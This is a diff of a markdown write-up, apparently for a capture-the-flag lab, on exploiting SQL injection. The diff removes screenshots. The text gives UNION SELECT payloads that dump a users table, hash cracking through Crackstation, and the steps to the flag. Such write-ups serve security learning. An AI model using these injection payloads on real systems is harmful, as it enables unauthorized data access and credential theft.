@@ -18,8 +18,6 @@ The application's failure to sanitize or parameterize user input enables this ex
 
 ### Steps to reproduce
 1. Discover the vulnerability by entering `1 OR 1=1`. 
-
-    <img src="img/image.png" alt="Print all users" width="30%"/>
 2. Determine the number of columns in the query using `ORDER BY` clause (2 in that case):
     ```sql
     1 ORDER BY 3
@@ -45,20 +43,13 @@ The application's failure to sanitize or parameterize user input enables this ex
     1 UNION SELECT CONCAT(user_id,0x7c,first_name,0x7c,last_name,0x7c,town), CONCAT(country,0x7c,planet,0x7c,Commentaire,0x7c,countersign) FROM users
     ```
     Since only two columns are available in our query and there are 8 columns to retrieve we used `CONCAT` to concatenate the columns with a separator between each column.
-    As seen in the first query, user 5 contains some interesting information. 
-
-    <img src="img/image-1.png" alt="Flag hint" width="80%">
+    As seen in the first query, user 5 contains some interesting information.
 7. Decrypt the password using [Crackstation](https://crackstation.net/).
-
-    <img src="img/image-2.png" alt="Decrypted password" width="80%">
-
 8. Lower the string and get the sha256sum:
     ```bash
     python3 -c "print('FortyTwo'.lower(), end='')" | sha256sum
     ```
-9. You got the flag:
-
-    <img src="img/image-4.png" alt="Flag" width="80%">
+9. You got the flag.
 
 ### Impact
 The SQL Injection vulnerability allows attackers to enumerate the database, exposing sensitive information such as table structures, column names, and user data. This can lead to unauthorized access, data theft, or further exploitation of the application.
